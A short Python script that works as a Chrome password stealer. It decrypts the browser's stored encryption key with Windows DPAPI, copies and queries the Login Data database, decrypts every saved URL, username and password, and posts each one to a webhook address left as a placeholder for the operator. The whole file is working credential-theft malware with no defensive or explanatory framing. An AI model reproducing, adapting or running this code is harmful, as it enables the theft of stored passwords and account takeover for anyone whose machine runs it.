import sqlite3
from Cryptodome.Cipher import AES
import win32crypt
import json
import base64
import os
import shutil
import requests

WEBHOOK = "<YOUR WEBHOOK>"

class getKeys:
    def __init__(self):
        self.ret = self.get_login_info()
        self.webhook = WEBHOOK

    def get_encrypt_key(self):
        path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State"
        with open(path, 'r', encoding='utf-8') as file:
            local_state = json.loads(file.read())
            encrypt_key = local_state["os_crypt"]["encrypted_key"]
        final_key = win32crypt.CryptUnprotectData(base64.b64decode(encrypt_key)[5:], None, None, None, 0)[1]
        return final_key

    def get_login_info(self):
        login_db = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\default\\Login Data"
        shutil.copy2(login_db, "Logincopy.db")
        key = self.get_encrypt_key()
        ret = []
        conn = sqlite3.connect("LoginCopy.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            if not url[:5] == "https" and not url[:4] == "http":
                continue
            username = login[1]
            ciphertext = login[2]
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            ret.append([url, username, decrypted_pass])
        conn.close()
        os.remove("Logincopy.db")
        return ret

    def send(self):
        for i in self.ret:
            data = "```URL: "+i[0]+'\nID: '+i[1]+"\nPW: "+i[2]+"```"
            requests.post(url=self.webhook, data={'content': data})
            
t = getKeys()
t.send()
